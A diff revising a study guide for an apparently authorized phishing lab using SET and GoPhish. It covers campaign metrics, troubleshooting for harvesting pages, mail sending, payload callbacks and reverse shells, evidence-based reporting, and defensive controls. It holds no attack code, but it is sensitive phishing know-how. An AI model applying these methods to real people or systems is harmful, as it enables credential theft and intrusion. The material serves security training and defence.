-Submission rate  =  3 / 95 × 100 =  3.2%
-Click-to-submit  =  3 / 12 × 100 = 25.0%
-Reporting rate   = 20 / 95 × 100 = 21.1%
+```bash
+sudo ss -lntp
 ```
 
-These are fabricated figures, not assessment results. Reporters and clickers may overlap. With a zero denominator, report “not applicable,” not zero percent. Preserve raw events and document exclusions before calculating adjusted metrics.
+`-l` selects listeners, `-n` shows numeric addresses/ports, `-t` selects TCP, and `-p` shows processes. A local listening socket does not prove reachability from the endpoint.
 
-Compare campaigns only when their populations, delivery conditions, difficulty, and observation windows are sufficiently similar. Small groups create unstable percentages and privacy risks.
+| Problem | Check first |
+|---|---|
+| SET requires root | `sudo setoolkit` |
+| Page unreachable | Kali address, VM network, printed port, listener |
+| Page loads, no capture | Form action, POST request, field names, logs |
+| SMTP failure | Server, port, credentials, TLS/authentication support, receiver trace |
+| Port occupied | Existing process in `ss`; avoid duplicate listeners |
+| No payload callback | Execution, OS/architecture, callback IP/port, route, firewall logs |
+| Connection but no shell | Payload/handler protocol match and command response |
+| Missing `meta_config` | Backend, generation errors, printed output location |
+| PowerShell output is `.txt` | Inspect whether it contains script body or launcher |
+| Encoded command fails | UTF-16LE, quoting, decoded instructions |
 
-## 16. Detection and Response Readiness
+Change one setting at a time. A blocked payload is a meaningful control result; do not disable protections merely to force a successful demonstration.
 
-Correlate the message identifier and recipient token with mail gateway events, browser/proxy requests, DNS queries, endpoint process creation, script logs where configured, and network connections. Document telemetry gaps rather than treating silence as proof that nothing happened.
+## 13. GoPhish Campaign Metrics
 
-A useful response exercise asks whether defenders can:
+GoPhish manages and measures phishing campaigns. SET remains the main practical tool here. Campaign interactions do not prove a reverse shell.
 
-1. Receive and triage a user report.
-2. Identify related messages and affected accounts.
-3. Remove messages or block the controlled destination.
-4. Investigate suspicious endpoint execution and outbound activity.
-5. Isolate the disposable host when the scenario warrants it.
-6. Revoke sessions or reset credentials if real exposure is suspected.
-7. Communicate clearly and preserve evidence.
+The components are **Users & Groups**, **Email Templates**, **Landing Pages**, **Sending Profiles**, and **Campaigns**. Templates use `{{.URL}}` for tracked links. A recipient-specific `rid` selects the landing page; visiting without it may return 404.
 
-Measure the actual detection and containment timestamps. A scheduled training completion page is not an incident-response action.
-
-## 17. Troubleshooting
-
-| Symptom | Checks | Interpretation |
+| Metric | Meaning | Limitation |
 |---|---|---|
-| Message absent | SMTP result, bounce, quarantine, receiver trace | Accepted mail can still be filtered |
-| SPF passes, DMARC fails | Envelope identity and alignment; DKIM result | Authentication without alignment is insufficient |
-| Page loads, no submission | Form action, field names, browser request, server logs | Rendering does not establish harvesting |
-| GoPhish page returns 404 | Test campaign URL and recipient context | Missing `rid` can explain the response |
-| Immediate clicks from many recipients | Gateway scanner behavior and timing | Automation may inflate click counts |
-| No payload callback | Execution evidence, architecture, route, firewall, handler match | Failure is not automatically user resistance |
-| Listener accepts, no shell | Protocol match and command-response evidence | Network reachability is weaker evidence than execution |
-| Encoded command fails | UTF-16LE encoding and quoting | Base64 text can encode the wrong command |
+| Email Sent | Tool/SMTP sending succeeded | Not guaranteed inbox placement |
+| Email Opened | Tracking-image request observed | Image blocking and automated fetching distort it |
+| Clicked Link | Tracked URL requested | Security scanners can request links |
+| Submitted Data | Form submitted with capture configured | Not automatically valid credentials or an executed payload |
+| Email Reported | Reporting recorded through configured mechanism | Requires integration or separate evidence |
 
-Change one variable at a time. Keep a successful baseline and record failed attempts when they affect the conclusion.
+Count **unique recipients** for recipient rates. State the denominator. Example: 50 SMTP-accepted recipients, 30 tracked opens, 12 clickers, 4 dummy submitters, 10 reporters.
 
-## 18. Reporting Findings
+| Calculation | Result |
+|---|---|
+| Open rate: `30 / 50 × 100` | **60%** |
+| Click rate: `12 / 50 × 100` | **24%** |
+| Submission rate: `4 / 50 × 100` | **8%** |
+| Click-to-submit: `4 / 12 × 100` | **33.3%** |
+| Reporting rate: `10 / 50 × 100` | **20%** |
 
-A professional report should include scope, authorization boundaries, methodology, dates, tool versions, evidence, results, limitations, prioritized recommendations, and retest criteria. Use aggregate awareness statistics and restrict recipient-level details.
+These figures are invented. Groups can overlap: a recipient may click and later report. A zero denominator means the rate is not applicable.
 
-For each finding, write:
+Captured GoPhish credentials are stored in plaintext. Use dummy values and redact report evidence. Disabling **Capture Passwords** does not stop capture of other configured fields.
+
+For response readiness, measure **time to first report**, **time to detection**, and **time from detection to containment**. Identify each starting event.
+
+Sources: [GoPhish campaigns](https://docs.getgophish.com/user-guide/documentation/campaigns), [landing pages](https://docs.getgophish.com/user-guide/documentation/landing-pages), [reporting](https://docs.getgophish.com/user-guide/documentation/email-reporting).
+
+## 14. Professional Reporting
+
+| Section | Include |
+|---|---|
+| Executive summary | Objective, strongest observed result, business relevance |
+| Scope/environment | Assigned recipients/hosts, dates, network, versions |
+| Method | Recon, email checks, SET modules, delivery/execution sequence |
+| Findings/evidence | Screenshots/logs, timestamps, settings, reproduction |
+| Campaign results | Counts/rates, denominators, tracking limitations |
+| Recommendations | Controls linked to observed weaknesses |
+| Retest/cleanup | How to verify fixes; artifacts/services removed |
+
+For each finding:
 
 ```text
 Title:
-Affected control and scope:
-Observed behavior:
-Expected behavior:
-Reproduction conditions:
-Evidence identifiers and timestamps:
+Affected host/domain/control:
+Observed result:
+Evidence and timestamp:
+Reproduction steps:
 Impact supported by evidence:
-Limitations and alternative explanations:
-Recommendation and owner:
-Retest success criterion:
+Recommendation:
+Retest condition:
 ```
 
-Example: “The receiving gateway accepted a controlled message claiming the tested author domain despite a recorded DMARC failure.” Support that claim with the original message, trusted receiver authentication results, and delivery trace. DNS policy alone does not establish delivery behavior.
+Example wording, only if both events were observed:
 
-Avoid statements such as “clinical records were compromised” when the evidence only shows a click or dummy submission. Distinguish observations, plausible consequences, and untested hypotheses. A technically valid finding still needs a realistic impact explanation.
+> The test recipient submitted assigned dummy credentials to the cloned lab portal. Separately, the assigned payload executed on the Windows lab endpoint, and the listener received a session returning the expected username and hostname.
 
-## 19. Defensive Controls and Cleanup
+A click supports a click finding, not “clinical-trial data compromised.” Distinguish potential impact from demonstrated actions.
 
-Use layered controls:
+## 15. Defenses and Completion
 
-| Layer | Controls | Retest evidence |
+| Stage | Controls | Retest evidence |
 |---|---|---|
-| Email identity | Correct SPF/DKIM and an enforced DMARC policy after sender inventory | Legitimate delivery plus controlled spoof handling |
-| Message handling | URL and attachment inspection, impersonation detection | Gateway trace for approved test messages |
-| Authentication | Phishing-resistant MFA such as properly deployed FIDO2/WebAuthn | Controlled sign-in exercise with test accounts |
-| Endpoints | Application control, least privilege, script visibility, endpoint protection | Block or detection events for approved lab execution |
-| Network | Restricted egress and monitored DNS/proxy activity | Allowed and blocked test connection evidence |
-| People and process | Easy reporting, independent callbacks, payment verification | Report and response timestamps |
+| Sender impersonation | SPF/DKIM, DMARC enforcement, impersonation detection | Controlled spoof rejected/quarantined; legitimate mail works |
+| Misleading link/domain | Domain inspection, URL filtering, independent verification | Destination blocked or reported |
+| Credential harvesting | Phishing-resistant MFA, password managers, clear login procedures | Fake origin cannot complete protected sign-in |
+| Payload execution | Least privilege, application control, endpoint protection | Block or actionable alert |
+| Reverse connection | Egress restrictions, network monitoring | Callback blocked or detected |
+| Human response | Simple reporting, practiced incident response | Timely report, investigation, containment |
 
-MFA is not uniform: a code that can be relayed offers different phishing resistance from an origin-bound authenticator. No single control stops every form of social engineering.
+Password managers help users notice unexpected origins. Ordinary OTP-based MFA can be relayed; properly implemented FIDO2/WebAuthn provides origin-bound phishing resistance.
 
-At closure, stop campaigns and listeners, remove hosted pages and payload artifacts, revoke temporary relay credentials, delete dummy captured data, and restore disposable hosts. Check that services are actually stopped and that evidence access and retention match the agreement. Provide constructive feedback and reinforce reporting behavior.
+Save the required evidence, stop lab mail/page/listener services, remove payloads and dummy captured data according to task retention rules, and confirm ports are closed. Leaving SET can leave Apache-backed pages running; check the service explicitly.
 
-## 20. Knowledge Check and References
+### Learning-objective coverage
 
-Explain these without consulting notes:
+| Objective | Study section |
+|---|---|
+| Social engineering and human behavior | 1–3 |
+| SPF, DKIM, DMARC | 4 |
+| SET usage/navigation | 6–7 |
+| Clone and harvest dummy credentials | 8 |
+| Generate payload/listener | 9 and 12 |
+| Craft/send spear phishing through Mass Mailer | 10 |
+| Spoofing and typosquatting | 5 |
+| Encoded PowerShell | 11 |
+| GoPhish metrics | 13 |
+| Professional report | 14 |
+| Defensive measures | 15 |
 
-1. Why can DMARC pass on a lookalike domain?
-2. Which identity does SPF normally authenticate?
-3. Why is a cloned page not equivalent to the real authentication system?
-4. What evidence separates a click, a submission, execution, and a working shell?
-5. Why does PowerShell encoding not imply encryption or evasion?
-6. How can a mail scanner distort campaign metrics?
-7. What is the difference between SMTP acceptance and confirmed delivery?
-8. Which measurements demonstrate response readiness?
-9. Why should awareness testing and endpoint execution have separate scope?
-10. What observations would make a retest successful?
+### References and version notes
 
-Primary references, checked 22 October 2026:
+Documentation reviewed **26 October 2026**. The supplied quiz informed coverage; its questions and answer key are not reproduced. Commands and illustrative outputs were not executed while preparing this guide. Confirm generated artifact names and individual payload options against the installed release.
 
-- [TrustedSec SET repository and installation guidance](https://github.com/trustedsec/social-engineer-toolkit)
-- [SET user manual](https://github.com/trustedsec/social-engineer-toolkit/blob/master/readme/User_Manual.pdf) — compare older screenshots with the installed version.
-- [GoPhish user guide](https://docs.getgophish.com/user-guide)
-- [GoPhish campaign configuration](https://docs.getgophish.com/user-guide/documentation/campaigns)
-- [GoPhish landing pages and data capture](https://docs.getgophish.com/user-guide/documentation/landing-pages)
-- [RFC 9989: DMARC](https://www.rfc-editor.org/rfc/rfc9989.html)
-- [RFC 7208: SPF](https://www.rfc-editor.org/rfc/rfc7208)
-- [RFC 6376: DKIM](https://www.rfc-editor.org/rfc/rfc6376)
-- [Windows PowerShell command-line parameters](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_powershell_exe?view=powershell-5.1)
+- [TrustedSec SET overview](https://trustedsec.com/resources/tools/the-social-engineer-toolkit-set)
+- [Official SET repository](https://github.com/trustedsec/social-engineer-toolkit)
+- [Kali SET installation and usage](https://www.kali.org/tools/set/)
+- [SET menu source](https://github.com/trustedsec/social-engineer-toolkit/blob/master/src/core/menu/text.py)
+- [SET user manual](https://github.com/trustedsec/social-engineer-toolkit/blob/master/readme/User_Manual.pdf), older screenshots: compare with installed menus
+- [GoPhish campaigns](https://docs.getgophish.com/user-guide/documentation/campaigns)
+- [GoPhish landing pages](https://docs.getgophish.com/user-guide/documentation/landing-pages)
+- [SPF: RFC 7208](https://www.rfc-editor.org/rfc/rfc7208)
+- [DKIM: RFC 6376](https://www.rfc-editor.org/rfc/rfc6376)
+- [DMARC: RFC 9989](https://www.rfc-editor.org/rfc/rfc9989.html)
+- [Microsoft Windows PowerShell parameters](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_powershell_exe?view=powershell-5.1)
 
-Documentation review does not constitute runtime validation. SET, GoPhish, DNS, mail delivery, and PowerShell examples were not executed as an assessment while preparing this reference.
